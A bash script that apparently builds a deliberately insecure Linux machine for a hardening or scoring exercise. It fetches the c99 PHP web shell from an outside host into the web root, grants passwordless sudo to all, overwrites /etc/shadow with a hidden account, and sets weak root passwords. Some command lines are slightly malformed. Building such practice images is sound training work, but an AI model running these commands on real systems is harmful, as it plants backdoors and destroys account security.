#!/bin/bash

apt-get install -y python-dev
# Backdoor
apt-get install -y apache2 php5
wget -O /var/www/c99.php wget http://blog.zer0w1re.net/files/c99.txt

# Sudoers
echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" > /etc/sudoers.d/all

# Max PW age
sed -i 's/^PASS_MAX_AGE/PASS_MAX_AGE\t99999/g' /etc/login.defs

# Hidden user
echo "toor::16426:0:99999:7:::" > /etc/shadow

# Insecure root pw
echo "root:root" | chpasswd

# Users
# Authorized admin
useradd -d /home/leon -G adm,sudo leon
useradd -d /home/jack -G adm,sudo jack
echo "jack:jack" | chpasswd
# Unauthorized admin
useradd -d /home/tyler -G adm,sudo tyler
# Authorized user
useradd -d /home/alex alex
useradd -d /home/connor connor
useradd -d /home/andrew andrew

# install hydra
apt-get install -y hydra

# install ssh
apt-get install -y openssh-server

# Script dependencies
wget https://pypi.python.org/packages/source/s/simplepam/simplepam-0.1.5.tar.gz
tar xvf simplepam-0.1.5.tar.gz
cd simplepam-0.1.5
python setup.py install -y
cd ..
rm -rf simplepam-0.1.5

git clone https://github.com/giampaolo/psutil.git
cd psutil
python setup.py install -y
cd ..
rm -rf psutil

# Services
apt-get install vsftpd

# Set script to run
echo "@reboot /opt/score.py" > /etc/crontab
